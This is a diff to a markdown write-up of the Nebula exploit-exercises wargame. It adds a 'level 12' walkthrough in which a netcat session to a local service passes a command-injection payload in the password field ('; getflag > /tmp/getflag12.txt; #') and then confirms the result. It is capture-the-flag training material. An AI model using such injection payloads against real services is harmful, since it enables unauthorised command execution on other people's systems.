@@ -5,6 +5,23 @@ nebula-exercises
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
 
+level 12
+--------
+
+##### connect to process and inject getflag call
+```bash
+level12@nebula:~$ nc localhost 50001
+Password: ; getflag > /tmp/getflag12.txt; #
+Better luck next time
+
+level12@nebula:~$ ll /tmp/getflag12.txt 
+-rw-r--r-- 1 flag12 flag12 59 2016-08-19 13:33 /tmp/getflag12.txt
+
+level12@nebula:~$ cat /tmp/getflag12.txt 
+You have successfully executed getflag on a target account
+```
+
+
 level 13
 --------
 
